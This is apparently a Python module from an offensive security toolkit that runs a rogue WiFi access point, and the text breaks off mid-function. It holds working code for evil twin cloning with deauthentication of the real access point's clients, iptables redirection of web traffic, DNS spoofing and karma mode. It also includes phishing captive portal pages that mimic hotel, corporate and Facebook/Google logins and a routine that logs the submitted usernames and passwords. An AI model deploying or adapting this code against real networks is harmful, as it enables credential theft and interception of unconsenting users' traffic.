"""AUTARCH WiFi Pineapple / Rogue AP

Evil twin AP, captive portal, karma attack, client MITM,
DNS spoofing, and credential capture for wireless assessments.
Designed for Raspberry Pi and SBCs with dual WiFi or WiFi + Ethernet.
"""

DESCRIPTION = "Rogue AP — evil twin, captive portal, karma attacks"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import time
import shutil
import signal
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any

try:
    from core.paths import find_tool, get_data_dir
except ImportError:
    def find_tool(name):
        return shutil.which(name)
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')


# ── Captive Portal HTML Templates ────────────────────────────────────────────

CAPTIVE_PORTAL_TEMPLATES = {
    'hotel_wifi': '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Hotel WiFi — Guest Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.portal{background:#1e2a3a;border-radius:12px;padding:40px;max-width:420px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
h1{font-size:1.5rem;margin-bottom:8px;color:#f0f0f0}
.subtitle{color:#8899aa;font-size:0.85rem;margin-bottom:24px;display:block}
label{display:block;font-size:0.85rem;color:#99aabb;margin-bottom:4px;margin-top:12px}
input{width:100%;padding:10px 14px;border:1px solid #334455;border-radius:6px;background:#0f1923;color:#e0e0e0;font-size:0.95rem}
input:focus{outline:none;border-color:#4a9eff}
.btn{width:100%;padding:12px;background:#4a9eff;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer;margin-top:20px;font-weight:600}
.btn:hover{background:#3a8eef}
.footer{text-align:center;margin-top:16px;font-size:0.75rem;color:#556677}
</style>
</head>
<body>
<div class="portal">
<h1>Welcome to Our Hotel</h1>
<span class="subtitle">Enter your room details to connect to the internet.</span>
<form method="POST" action="/portal/capture">
<label>Room Number</label>
<input type="text" name="username" placeholder="e.g. 412" required>
<label>Last Name</label>
<input type="text" name="password" placeholder="Guest last name" required>
<label>Email Address</label>
<input type="email" name="email" placeholder="email@example.com">
<button type="submit" class="btn">Connect to WiFi</button>
</form>
<div class="footer">By connecting you agree to our Terms of Service and Acceptable Use Policy.</div>
</div>
</body>
</html>''',

    'corporate': '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Corporate Network — Authentication</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0c1117;color:#c9d1d9;min-height:100vh;display:flex;align-items:center;justify-content:center}
.portal{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:36px;max-width:400px;width:90%;box-shadow:0 8px 24px rgba(0,0,0,0.4)}
.logo{text-align:center;margin-bottom:20px;font-size:1.8rem;font-weight:700;color:#58a6ff;letter-spacing:2px}
h1{font-size:1.1rem;text-align:center;margin-bottom:4px}
.subtitle{text-align:center;color:#8b949e;font-size:0.8rem;margin-bottom:24px;display:block}
label{display:block;font-size:0.82rem;color:#8b949e;margin-bottom:4px;margin-top:12px}
input{width:100%;padding:10px 12px;border:1px solid #30363d;border-radius:6px;background:#0d1117;color:#c9d1d9;font-size:0.9rem}
input:focus{outline:none;border-color:#58a6ff}
.btn{width:100%;padding:11px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:0.95rem;cursor:pointer;margin-top:20px;font-weight:600}
.btn:hover{background:#2ea043}
.footer{text-align:center;margin-top:16px;font-size:0.7rem;color:#484f58}
.warn{background:#1a1206;border:1px solid #3b2e04;color:#d29922;padding:8px 12px;border-radius:6px;font-size:0.78rem;margin-top:16px;text-align:center}
</style>
</head>
<body>
<div class="portal">
<div class="logo">SECURE NET</div>
<h1>Network Authentication</h1>
<span class="subtitle">Sign in with your corporate credentials to access the network.</span>
<form method="POST" action="/portal/capture">
<label>Username or Employee ID</label>
<input type="text" name="username" placeholder="jsmith or EMP-1234" required>
<label>Password</label>
<input type="password" name="password" placeholder="Enter your password" required>
<label>Domain (optional)</label>
<input type="text" name="domain" placeholder="CORP" value="CORP">
<button type="submit" class="btn">Authenticate</button>
</form>
<div class="warn">This is a monitored network. Unauthorized access is prohibited.</div>
<div class="footer">IT Security Policy v3.2 — Contact helpdesk@corp.local for support</div>
</div>
</body>
</html>''',

    'social_login': '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Free WiFi — Connect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center}
.portal{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.25)}
h1{font-size:1.4rem;text-align:center;color:#333;margin-bottom:4px}
.subtitle{text-align:center;color:#888;font-size:0.85rem;margin-bottom:24px;display:block}
label{display:block;font-size:0.82rem;color:#666;margin-bottom:4px;margin-top:14px}
input{width:100%;padding:11px 14px;border:1px solid #ddd;border-radius:8px;background:#fafafa;color:#333;font-size:0.9rem}
input:focus{outline:none;border-color:#667eea}
.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:0.95rem;cursor:pointer;margin-top:12px;font-weight:600;color:#fff}
.btn-social{background:#1877f2;margin-top:24px}
.btn-social:hover{background:#166fe5}
.btn-google{background:#ea4335}
.btn-google:hover{background:#d33426}
.btn-email{background:#333;margin-top:8px}
.btn-email:hover{background:#555}
.divider{text-align:center;color:#aaa;font-size:0.8rem;margin:16px 0;position:relative}
.divider:before,.divider:after{content:'';position:absolute;top:50%;width:38%;height:1px;background:#ddd}
.divider:before{left:0}
.divider:after{right:0}
.footer{text-align:center;margin-top:16px;font-size:0.7rem;color:#aaa}
</style>
</head>
<body>
<div class="portal">
<h1>Free WiFi Hotspot</h1>
<span class="subtitle">Sign in to get connected.</span>
<form method="POST" action="/portal/capture">
<button type="submit" name="provider" value="facebook" class="btn btn-social">Continue with Facebook</button>
<button type="submit" name="provider" value="google" class="btn btn-google">Continue with Google</button>
<div class="divider">or sign in with email</div>
<label>Email</label>
<input type="email" name="username" placeholder="your@email.com" required>
<label>Password</label>
<input type="password" name="password" placeholder="Enter password" required>
<button type="submit" class="btn btn-email">Connect</button>
</form>
<div class="footer">By connecting you agree to our Terms and Privacy Policy.</div>
</div>
</body>
</html>''',

    'terms_accept': '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WiFi — Accept Terms</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#111;color:#ccc;min-height:100vh;display:flex;align-items:center;justify-content:center}
.portal{background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:36px;max-width:480px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,0.5)}
h1{font-size:1.3rem;margin-bottom:8px;color:#eee}
.subtitle{color:#888;font-size:0.82rem;margin-bottom:16px;display:block}
.terms-box{background:#111;border:1px solid #333;border-radius:6px;padding:14px;max-height:200px;overflow-y:auto;font-size:0.78rem;color:#999;line-height:1.6;margin-bottom:16px}
label.check{display:flex;align-items:center;gap:8px;font-size:0.85rem;color:#bbb;cursor:pointer;margin-bottom:12px}
label.check input{width:18px;height:18px}
.form-group{margin-top:12px}
.form-group label{display:block;font-size:0.82rem;color:#888;margin-bottom:4px}
.form-group input{width:100%;padding:10px;border:1px solid #333;border-radius:6px;background:#111;color:#ccc;font-size:0.9rem}
.btn{width:100%;padding:12px;background:#6366f1;color:#fff;border:none;border-radius:6px;font-size:0.95rem;cursor:pointer;margin-top:16px;font-weight:600}
.btn:hover{background:#818cf8}
.btn:disabled{background:#333;color:#666;cursor:not-allowed}
.footer{text-align:center;margin-top:12px;font-size:0.7rem;color:#555}
</style>
</head>
<body>
<div class="portal">
<h1>WiFi Access</h1>
<span class="subtitle">Please accept the terms of service to connect.</span>
<div class="terms-box">
<p><strong>Terms of Service</strong></p>
<p>1. This wireless network is provided for authorized use only. By accessing this network, you agree to be bound by these terms.</p>
<p>2. You agree not to engage in any illegal or unauthorized activity while using this network. All network traffic may be monitored and logged.</p>
<p>3. The network provider is not responsible for any data loss, security breaches, or damages resulting from use of this network.</p>
<p>4. You acknowledge that this is a shared network and that data transmitted may be visible to other users. Use of VPN is recommended for sensitive communications.</p>
<p>5. The provider reserves the right to terminate access at any time without notice for any violation of these terms.</p>
<p>6. Maximum bandwidth allocation applies. Streaming and large downloads may be throttled during peak hours.</p>
<p>7. You agree to provide accurate registration information.</p>
</div>
<form method="POST" action="/portal/capture">
<label class="check">
<input type="checkbox" id="accept-terms" onchange="document.getElementById('connect-btn').disabled=!this.checked">
I accept the Terms of Service
</label>
<div class="form-group">
<label>Name (optional)</label>
<input type="text" name="username" placeholder="Your name">
</div>
<div class="form-group">
<label>Email (optional)</label>
<input type="email" name="email" placeholder="your@email.com">
</div>
<input type="hidden" name="password" value="[terms_accepted]">
<button type="submit" id="connect-btn" class="btn" disabled>Accept & Connect</button>
</form>
<div class="footer">Network operated by WiFi Services Inc.</div>
</div>
</body>
</html>''',
}

PORTAL_SUCCESS_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#111;color:#ccc;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#1a1a1a;border-radius:12px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 12px 40px rgba(0,0,0,0.5)}
.icon{font-size:3rem;margin-bottom:12px}
h1{font-size:1.3rem;margin-bottom:8px;color:#4ade80}
p{color:#888;font-size:0.85rem;line-height:1.5}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#x2705;</div>
<h1>Connected Successfully</h1>
<p>You are now connected to the internet. You may close this page and begin browsing.</p>
</div>
</body>
</html>'''


# ── Pineapple AP Class ───────────────────────────────────────────────────────

class PineappleAP:
    """WiFi Pineapple / Rogue AP controller."""

    _instance = None

    def __init__(self):
        data_dir = get_data_dir()
        if isinstance(data_dir, Path):
            data_dir = str(data_dir)
        self.data_dir = os.path.join(data_dir, 'pineapple')
        os.makedirs(self.data_dir, exist_ok=True)

        self.configs_dir = os.path.join(self.data_dir, 'configs')
        os.makedirs(self.configs_dir, exist_ok=True)
        self.captures_dir = os.path.join(self.data_dir, 'captures')
        os.makedirs(self.captures_dir, exist_ok=True)
        self.traffic_dir = os.path.join(self.data_dir, 'traffic')
        os.makedirs(self.traffic_dir, exist_ok=True)

        # Tool paths
        self.hostapd = find_tool('hostapd') or shutil.which('hostapd')
        self.dnsmasq = find_tool('dnsmasq') or shutil.which('dnsmasq')
        self.iptables = find_tool('iptables') or shutil.which('iptables')
        self.nftables = find_tool('nft') or shutil.which('nft')
        self.airbase = find_tool('airbase-ng') or shutil.which('airbase-ng')
        self.aireplay = find_tool('aireplay-ng') or shutil.which('aireplay-ng')
        self.sslstrip_bin = find_tool('sslstrip') or shutil.which('sslstrip')
        self.tcpdump = find_tool('tcpdump') or shutil.which('tcpdump')
        self.iwconfig_bin = shutil.which('iwconfig')
        self.iw_bin = shutil.which('iw')
        self.ip_bin = shutil.which('ip')

        # State
        self._ap_running = False
        self._ap_ssid = ''
        self._ap_channel = 6
        self._ap_interface = ''
        self._internet_interface = ''
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._portal_active = False
        self._portal_type = ''
        self._karma_active = False
        self._karma_proc: Optional[subprocess.Popen] = None
        self._sslstrip_proc: Optional[subprocess.Popen] = None
        self._sslstrip_active = False
        self._sniff_proc: Optional[subprocess.Popen] = None
        self._dns_spoofs: Dict[str, str] = {}
        self._dns_spoof_active = False
        self._clients: Dict[str, Dict] = {}
        self._portal_captures: List[Dict] = []
        self._traffic_stats: Dict[str, Any] = {
            'total_bytes': 0, 'top_domains': {}, 'top_clients': {}
        }
        self._lock = threading.Lock()

        # Load persisted captures
        self._load_captures()

    # ── Interface Management ─────────────────────────────────────────────

    def get_interfaces(self) -> List[Dict]:
        """List wireless interfaces with driver info, mode, channel."""
        interfaces = []

        # Try iw first
        if self.iw_bin:
            try:
                out = subprocess.check_output(
                    [self.iw_bin, 'dev'], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                current_phy = ''
                iface = None
                for line in out.splitlines():
                    stripped = line.strip()
                    if stripped.startswith('phy#'):
                        current_phy = stripped
                    elif stripped.startswith('Interface'):
                        if iface:
                            interfaces.append(iface)
                        iface = {
                            'name': stripped.split()[-1],
                            'mode': 'managed',
                            'channel': 0,
                            'mac': '',
                            'phy': current_phy,
                            'driver': ''
                        }
                    elif iface:
                        if stripped.startswith('type'):
                            iface['mode'] = stripped.split()[-1]
                        elif stripped.startswith('channel'):
                            try:
                                iface['channel'] = int(stripped.split()[1])
                            except (ValueError, IndexError):
                                pass
                        elif stripped.startswith('addr'):
                            iface['mac'] = stripped.split()[-1]
                if iface:
                    interfaces.append(iface)
            except Exception:
                pass

        # Get driver info from /sys
        for iface in interfaces:
            try:
                driver_link = Path(f'/sys/class/net/{iface["name"]}/device/driver')
                if driver_link.exists():
                    iface['driver'] = os.path.basename(os.readlink(str(driver_link)))
            except Exception:
                pass

        # Fallback to iwconfig
        if not interfaces and self.iwconfig_bin:
            try:
                out = subprocess.check_output(
                    [self.iwconfig_bin], text=True,
                    stderr=subprocess.DEVNULL, timeout=5
                )
                for block in out.split('\n\n'):
                    if 'IEEE 802.11' in block or 'ESSID' in block:
                        name = block.split()[0]
                        mode = 'managed'
                        if 'Mode:Monitor' in block:
                            mode = 'monitor'
                        elif 'Mode:Master' in block:
                            mode = 'master'
                        ch_m = re.search(r'Channel[:\s]*(\d+)', block)
                        ch = int(ch_m.group(1)) if ch_m else 0
                        interfaces.append({
                            'name': name, 'mode': mode, 'channel': ch,
                            'mac': '', 'phy': '', 'driver': ''
                        })
            except Exception:
                pass

        # Fallback: /sys/class/net
        if not interfaces:
            try:
                wireless_dir = Path('/sys/class/net')
                if wireless_dir.exists():
                    for d in wireless_dir.iterdir():
                        if (d / 'wireless').exists() or (d / 'phy80211').exists():
                            driver = ''
                            try:
                                dl = d / 'device' / 'driver'
                                if dl.exists():
                                    driver = os.path.basename(os.readlink(str(dl)))
                            except Exception:
                                pass
                            interfaces.append({
                                'name': d.name, 'mode': 'unknown', 'channel': 0,
                                'mac': '', 'phy': '', 'driver': driver
                            })
            except Exception:
                pass

        # Also list non-wireless interfaces (for internet_interface)
        # Tag each with 'wireless': True/False
        wireless_names = {i['name'] for i in interfaces}
        for iface in interfaces:
            iface['wireless'] = True

        try:
            net_dir = Path('/sys/class/net')
            if net_dir.exists():
                for d in net_dir.iterdir():
                    if d.name not in wireless_names and d.name != 'lo':
                        # Check if it's up and has carrier
                        try:
                            operstate = (d / 'operstate').read_text().strip()
                        except Exception:
                            operstate = 'unknown'
                        interfaces.append({
                            'name': d.name, 'mode': operstate,
                            'channel': 0, 'mac': '', 'phy': '',
                            'driver': '', 'wireless': False
                        })
        except Exception:
            pass

        return interfaces

    def get_tools_status(self) -> Dict[str, bool]:
        """Check availability of all required tools."""
        return {
            'hostapd': self.hostapd is not None,
            'dnsmasq': self.dnsmasq is not None,
            'iptables': self.iptables is not None,
            'nft': self.nftables is not None,
            'airbase-ng': self.airbase is not None,
            'aireplay-ng': self.aireplay is not None,
            'sslstrip': self.sslstrip_bin is not None,
            'tcpdump': self.tcpdump is not None,
            'iw': self.iw_bin is not None,
            'ip': self.ip_bin is not None,
        }

    # ── Rogue AP ─────────────────────────────────────────────────────────

    def start_rogue_ap(self, ssid: str, interface: str, channel: int = 6,
                       encryption: str = 'open', password: str = None,
                       internet_interface: str = None) -> Dict:
        """Configure and start hostapd-based rogue access point."""
        if self._ap_running:
            return {'ok': False, 'error': 'AP is already running. Stop it first.'}
        if not self.hostapd:
            return {'ok': False, 'error': 'hostapd not found. Install with: apt install hostapd'}
        if not self.dnsmasq:
            return {'ok': False, 'error': 'dnsmasq not found. Install with: apt install dnsmasq'}
        if not ssid or not interface:
            return {'ok': False, 'error': 'SSID and interface are required'}

        try:
            # Build hostapd configuration
            hostapd_conf = os.path.join(self.configs_dir, 'hostapd.conf')
            conf_lines = [
                f'interface={interface}',
                f'ssid={ssid}',
                f'channel={channel}',
                'driver=nl80211',
                'hw_mode=g',
                'wmm_enabled=0',
                'macaddr_acl=0',
                'auth_algs=1',
                'ignore_broadcast_ssid=0',
            ]

            if encryption == 'wpa2' and password:
                conf_lines.extend([
                    'wpa=2',
                    'wpa_key_mgmt=WPA-PSK',
                    f'wpa_passphrase={password}',
                    'rsn_pairwise=CCMP',
                ])
            elif encryption == 'wpa' and password:
                conf_lines.extend([
                    'wpa=1',
                    'wpa_key_mgmt=WPA-PSK',
                    f'wpa_passphrase={password}',
                    'wpa_pairwise=TKIP',
                ])

            with open(hostapd_conf, 'w') as f:
                f.write('\n'.join(conf_lines) + '\n')

            # Configure interface IP
            ap_ip = '10.0.0.1'
            ap_subnet = '10.0.0.0/24'
            if self.ip_bin:
                subprocess.run(
                    [self.ip_bin, 'addr', 'flush', 'dev', interface],
                    capture_output=True, timeout=5
                )
                subprocess.run(
                    [self.ip_bin, 'addr', 'add', f'{ap_ip}/24', 'dev', interface],
                    capture_output=True, timeout=5
                )
                subprocess.run(
                    [self.ip_bin, 'link', 'set', interface, 'up'],
                    capture_output=True, timeout=5
                )

            # Build dnsmasq configuration
            dnsmasq_conf = os.path.join(self.configs_dir, 'dnsmasq.conf')
            dns_lines = [
                f'interface={interface}',
                'bind-interfaces',
                f'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h',
                f'dhcp-option=3,{ap_ip}',
                f'dhcp-option=6,{ap_ip}',
                f'server=8.8.8.8',
                f'server=8.8.4.4',
                'log-queries',
                f'log-facility={os.path.join(self.data_dir, "dnsmasq.log")}',
                f'dhcp-leasefile={os.path.join(self.data_dir, "dnsmasq.leases")}',
            ]

            # Add DNS spoofs if active
            if self._dns_spoof_active and self._dns_spoofs:
                for domain, ip in self._dns_spoofs.items():
                    dns_lines.append(f'address=/{domain}/{ip}')

            with open(dnsmasq_conf, 'w') as f:
                f.write('\n'.join(dns_lines) + '\n')

            # Set up NAT/forwarding if internet interface provided
            if internet_interface:
                self._setup_nat(interface, internet_interface, ap_subnet)
                self._internet_interface = internet_interface

            # Start hostapd
            self._hostapd_proc = subprocess.Popen(
                [self.hostapd, hostapd_conf],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(1)

            # Check if hostapd started OK
            if self._hostapd_proc.poll() is not None:
                stderr = self._hostapd_proc.stderr.read().decode(errors='replace')
                return {'ok': False, 'error': f'hostapd failed to start: {stderr[:300]}'}

            # Start dnsmasq
            self._dnsmasq_proc = subprocess.Popen(
                [self.dnsmasq, '-C', dnsmasq_conf, '-d'],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(0.5)

            if self._dnsmasq_proc.poll() is not None:
                stderr = self._dnsmasq_proc.stderr.read().decode(errors='replace')
                self._hostapd_proc.terminate()
                return {'ok': False, 'error': f'dnsmasq failed to start: {stderr[:300]}'}

            self._ap_running = True
            self._ap_ssid = ssid
            self._ap_channel = channel
            self._ap_interface = interface

            return {
                'ok': True,
                'message': f'Rogue AP "{ssid}" started on {interface} (ch {channel})',
                'ssid': ssid,
                'channel': channel,
                'interface': interface,
                'ip': ap_ip,
                'encryption': encryption,
                'nat': internet_interface is not None
            }

        except Exception as e:
            self.stop_rogue_ap()
            return {'ok': False, 'error': str(e)}

    def stop_rogue_ap(self) -> Dict:
        """Stop rogue AP, kill hostapd/dnsmasq, cleanup."""
        errors = []

        # Kill hostapd
        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=5)
            except Exception:
                try:
                    self._hostapd_proc.kill()
                except Exception:
                    pass
            self._hostapd_proc = None

        # Kill dnsmasq
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=5)
            except Exception:
                try:
                    self._dnsmasq_proc.kill()
                except Exception:
                    pass
            self._dnsmasq_proc = None

        # Remove NAT rules
        if self._internet_interface and self._ap_interface:
            self._teardown_nat(self._ap_interface, self._internet_interface)

        # Stop captive portal if running
        if self._portal_active:
            self.stop_captive_portal()

        # Stop karma if running
        if self._karma_active:
            self.disable_karma()

        # Stop SSL strip if running
        if self._sslstrip_active:
            self.disable_ssl_strip()

        # Flush interface IP
        if self.ip_bin and self._ap_interface:
            try:
                subprocess.run(
                    [self.ip_bin, 'addr', 'flush', 'dev', self._ap_interface],
                    capture_output=True, timeout=5
                )
            except Exception:
                pass

        self._ap_running = False
        self._ap_ssid = ''
        self._ap_channel = 6
        self._ap_interface = ''
        self._internet_interface = ''
        self._clients.clear()

        return {'ok': True, 'message': 'Rogue AP stopped and cleaned up'}

    def is_running(self) -> bool:
        """Check if AP is active."""
        if self._ap_running and self._hostapd_proc:
            if self._hostapd_proc.poll() is not None:
                self._ap_running = False
        return self._ap_running

    def get_status(self) -> Dict:
        """Get AP status details."""
        running = self.is_running()
        return {
            'running': running,
            'ssid': self._ap_ssid if running else '',
            'channel': self._ap_channel if running else 0,
            'interface': self._ap_interface if running else '',
            'internet_interface': self._internet_interface if running else '',
            'client_count': len(self._clients) if running else 0,
            'portal_active': self._portal_active,
            'portal_type': self._portal_type,
            'karma_active': self._karma_active,
            'sslstrip_active': self._sslstrip_active,
            'dns_spoof_active': self._dns_spoof_active,
            'dns_spoofs': self._dns_spoofs if self._dns_spoof_active else {},
            'capture_count': len(self._portal_captures),
            'tools': self.get_tools_status()
        }

    # ── Evil Twin ────────────────────────────────────────────────────────

    def evil_twin(self, target_ssid: str, target_bssid: str, interface: str,
                  internet_interface: str = None) -> Dict:
        """Clone target AP config and start rogue AP with same parameters."""
        if self._ap_running:
            return {'ok': False, 'error': 'AP already running. Stop it first.'}
        if not target_ssid or not interface:
            return {'ok': False, 'error': 'Target SSID and interface are required'}

        # Try to determine target channel
        channel = 6  # default
        if self.iw_bin:
            try:
                out = subprocess.check_output(
                    [self.iw_bin, 'dev', interface, 'scan'],
                    text=True, timeout=15, stderr=subprocess.DEVNULL
                )
                # Parse scan output for the target BSSID/SSID
                bss_block = ''
                capture = False
                for line in out.splitlines():
                    if line.startswith('BSS '):
                        if capture and bss_block:
                            break
                        bssid_found = line.split()[1].split('(')[0].upper()
                        if target_bssid and bssid_found == target_bssid.upper():
                            capture = True
                            bss_block = ''
                        else:
                            capture = False
                    if capture:
                        bss_block += line + '\n'

                if bss_block:
                    ch_m = re.search(r'DS Parameter set: channel (\d+)', bss_block)
                    if ch_m:
                        channel = int(ch_m.group(1))
                    else:
                        ch_m = re.search(r'primary channel: (\d+)', bss_block)
                        if ch_m:
                            channel = int(ch_m.group(1))
            except Exception:
                pass

        # Optionally deauth clients from real AP
        if target_bssid and self.aireplay:
            try:
                subprocess.Popen(
                    [self.aireplay, '-0', '5', '-a', target_bssid, interface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass  # Non-fatal: deauth is optional

        # Start AP with cloned params
        result = self.start_rogue_ap(
            ssid=target_ssid,
            interface=interface,
            channel=channel,
            encryption='open',
            internet_interface=internet_interface
        )

        if result.get('ok'):
            result['message'] = (
                f'Evil twin for "{target_ssid}" started on ch {channel}'
                + (f' (cloned from {target_bssid})' if target_bssid else '')
            )
            result['evil_twin'] = True
            result['target_bssid'] = target_bssid

        return result

    # ── Captive Portal ───────────────────────────────────────────────────

    def start_captive_portal(self, portal_type: str = 'hotel_wifi',
                             custom_html: str = None) -> Dict:
        """Set up iptables to redirect HTTP to captive portal."""
        if not self._ap_running:
            return {'ok': False, 'error': 'Start rogue AP first before enabling captive portal'}
        if not self.iptables:
            return {'ok': False, 'error': 'iptables not found'}

        ap_ip = '10.0.0.1'

        try:
            # Redirect HTTP (port 80) to our portal server
            subprocess.run([
                self.iptables, '-t', 'nat', '-A', 'PREROUTING',
                '-i', self._ap_interface, '-p', 'tcp', '--dport', '80',
                '-j', 'DNAT', '--to-destination', f'{ap_ip}:8080'
            ], capture_output=True, timeout=5)

            # Redirect HTTPS (port 443) to portal as well
            subprocess.run([
                self.iptables, '-t', 'nat', '-A', 'PREROUTING',
                '-i', self._ap_interface, '-p', 'tcp', '--dport', '443',
                '-j', 'DNAT', '--to-destination', f'{ap_ip}:8080'
            ], capture_output=True, timeout=5)

            # Allow the redirect
            subprocess.run([
                self.iptables, '-A', 'FORWARD',
                '-i', self._ap_interface, '-p', 'tcp', '--dport', '8080',
                '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)

            self._portal_active = True
            self._portal_type = portal_type

            # Save portal HTML for serving
            if custom_html:
                portal_html = custom_html
            else:
                portal_html = CAPTIVE_PORTAL_TEMPLATES.get(portal_type, '')
                if not portal_html:
                    portal_html = CAPTIVE_PORTAL_TEMPLATES.get('hotel_wifi', '')

            portal_file = os.path.join(self.configs_dir, 'portal.html')
            with open(portal_file, 'w') as f:
                f.write(portal_html)

            success_file = os.path.join(self.configs_dir, 'portal_success.html')
            with open(success_file, 'w') as f:
                f.write(PORTAL_SUCCESS_PAGE)

            return {
                'ok': True,
                'message': f'Captive portal ({portal_type}) enabled',
                'portal_type': portal_type,
                'redirect_ip': ap_ip
            }

        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def stop_captive_portal(self) -> Dict:
        """Remove captive portal iptables redirect rules."""
        if not self._portal_active:
            return {'ok': False, 'error': 'No captive portal is running'}

        ap_ip = '10.0.0.1'

        try:
            if self.iptables and self._ap_interface:
                # Remove HTTP redirect
                subprocess.run([
                    self.iptables, '-t', 'nat', '-D', 'PREROUTING',
                    '-i', self._ap_interface, '-p', 'tcp', '--dport', '80',
                    '-j', 'DNAT', '--to-destination', f'{ap_ip}:8080'
                ], capture_output=True, timeout=5)

                # Remove HTTPS redirect
                subprocess.run([
                    self.iptables, '-t', 'nat', '-D', 'PREROUTING',
                    '-i', self._ap_interface, '-p', 'tcp', '--dport', '443',
                    '-j', 'DNAT', '--to-destination', f'{ap_ip}:8080'
                ], capture_output=True, timeout=5)

                # Remove forward rule
                subprocess.run([
                    self.iptables, '-D', 'FORWARD',
                    '-i', self._ap_interface, '-p', 'tcp', '--dport', '8080',
                    '-j', 'ACCEPT'
                ], capture_output=True, timeout=5)

        except Exception:
            pass

        self._portal_active = False
        self._portal_type = ''
        return {'ok': True, 'message': 'Captive portal stopped'}

    def capture_portal_creds(self, data: Dict) -> Dict:
        """Log credentials from portal form submission."""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'username': data.get('username', ''),
            'password': data.get('password', ''),
            'email': data.get('email', ''),
            'domain': data.get('domain', ''),
            'provider': data.get('provider', ''),
            'ip': data.get('ip', ''),
            'user_agent': data.get('user_agent', ''),
        }

        with self._lock:
            self._portal_captures.append(entry)
            self._save_captures()

        return {'ok': True, 'count': len(self._portal_captures)}

    def get_portal_captures(self) -> List[Dict]:
        """Return all captured portal credentials."""
        return list(self._portal_captures)

    def get_portal_html(self) -> str:
        """Return the current portal HTML page."""
        portal_file = os.path.join(self.configs_dir, 'portal.html')
        if os.path.exists(portal_file):
            with open(portal_file, 'r') as f:
                return f.read()
        # Default fallback
        return CAPTIVE_PORTAL_TEMPLATES.get('hotel_wifi', '<html><body>Portal</body></html>')

    def get_portal_success_html(self) -> str:
        """Return the portal success page HTML."""
        success_file = os.path.join(self.configs_dir, 'portal_success.html')
        if os.path.exists(success_file):
            with open(success_file, 'r') as f:
                return f.read()
        return PORTAL_SUCCESS_PAGE

    # ── Karma Attack ─────────────────────────────────────────────────────

    def enable_karma(self, interface: str = None) -> Dict:
        """Enable karma mode: respond to all probe requests."""
        iface = interface or self._ap_interface
        if not iface:
            return {'ok': False, 'error': 'No interface specified'}
        if self._karma_active:
            return {'ok': False, 'error': 'Karma mode is already active'}

        # Prefer hostapd-mana if available
        hostapd_mana = find_tool('hostapd-mana') or shutil.which('hostapd-mana')

        if hostapd_mana:
            # Generate karma-enabled hostapd-mana config
            karma_conf = os.path.join(self.configs_dir, 'karma.conf')
            conf_lines = [
                f'interface={iface}',
                'ssid=FreeWiFi',
                'channel=6',
                'driver=nl80211',
                'hw_mode=g',
                'enable_karma=1',
                'karma_black_white=0',
            ]
            with open(karma_conf, 'w') as f:
                f.write('\n'.join(conf_lines) + '\n')

            try:
                self._karma_proc = subprocess.Popen(
                    [hostapd_mana, karma_conf],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                time.sleep(1)
                if self._karma_proc.poll() is not None:
                    stderr = self._karma_proc.stderr.read().decode(errors='replace')
                    return {'ok': False, 'error': f'hostapd-mana failed: {stderr[:200]}'}

                self._karma_active = True
                return {'ok': True, 'message': 'Karma mode enabled via hostapd-mana'}
            except Exception as e:
                return {'ok': False, 'error': str(e)}

        # Fallback: airbase-ng for karma
        elif self.airbase:
            try:
